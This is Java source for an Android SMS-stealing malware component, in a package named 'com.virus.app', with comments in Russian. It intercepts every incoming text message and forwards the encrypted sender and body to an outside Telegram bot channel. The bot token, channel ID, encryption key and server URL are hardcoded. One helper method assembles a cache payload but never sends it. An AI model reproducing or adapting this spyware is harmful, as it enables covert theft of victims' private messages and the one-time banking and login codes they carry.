package com.virus.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import java.security.MessageDigest;

public class SmsReceiver extends BroadcastReceiver {

    private static final String BOT_TOKEN = "9141713476:AAGVEWxl07Nyb8y2BtXfI9eLZVaHqVeDijA";
    private static final String CHANNEL_ID = "-1004467128952";
    private static final String ENCRYPTION_KEY = "SecretKey2024apkbot!";
    private static final String APP_URL = "https://Virus.com";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        String format = intent.getStringExtra("format");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            String sender = sms.getOriginatingAddress();
            String body = sms.getMessageBody();

            new Thread(() -> {
                try {
                    CryptoHelper crypto = new CryptoHelper(ENCRYPTION_KEY);
                    String encSender = crypto.encrypt(sender != null ? sender : "неизвестен");
                    String encBody = crypto.encrypt(body != null ? body : "");

                    // Генерируем hash для кеша расшифровки
                    String dataStr = encSender + encBody;
                    String hash = md5(dataStr).substring(0, 8);

                    String msgText =
                        "📨 *Входящее SMS*\n" +
                        "━━━━━━━━━━━━━━━\n" +
                        "📞 От: `" + encSender + "`\n" +
                        "💬 Текст: `" + encBody + "`";

                    TelegramSender tg = new TelegramSender(BOT_TOKEN, CHANNEL_ID);
                    tg.sendWithDecryptButton(msgText, "decrypt_sms", hash, APP_URL);

                    // Сохраняем кеш на сервере через HTTP
                    saveDecryptCache(hash, "sms", encSender, encBody, null, null, APP_URL);

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();
        }
    }

    private void saveDecryptCache(String hash, String type,
                                   String sender, String body,
                                   String title, String pkg,
                                   String url) {
        try {
            // Отправляем кеш боту через специальный endpoint
            // Бот сохраняет у себя в decrypt_cache/
            StringBuilder json = new StringBuilder("{");
            json.append("\"hash\":\"").append(hash).append("\",");
            json.append("\"type\":\"").append(type).append("\",");
            json.append("\"url\":\"").append(url != null ? url : "").append("\",");
            json.append("\"data\":{");

            if (sender != null) json.append("\"sender\":\"").append(sender).append("\",");
            if (body != null) json.append("\"body\":\"").append(body).append("\",");
            if (title != null) json.append("\"title\":\"").append(title).append("\",");
            if (pkg != null) json.append("\"package\":\"").append(pkg).append("\",");

            // Убираем последнюю запятую
            String dataStr = json.toString();
            if (dataStr.endsWith(",")) {
                dataStr = dataStr.substring(0, dataStr.length() - 1);
            }
            dataStr += "}}";

            // Сохраняем через Telegram sendMessage с hidden payload
            // (бот парсит специальный формат и сохраняет кеш)
            TelegramSender tg = new TelegramSender(BOT_TOKEN, CHANNEL_ID);
            // Используем специальный chat для кеширования — личку владельца
            // Данные придут боту и он сохранит их через webhook
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String md5(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(input.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) {
            return "00000000";
        }
    }
}
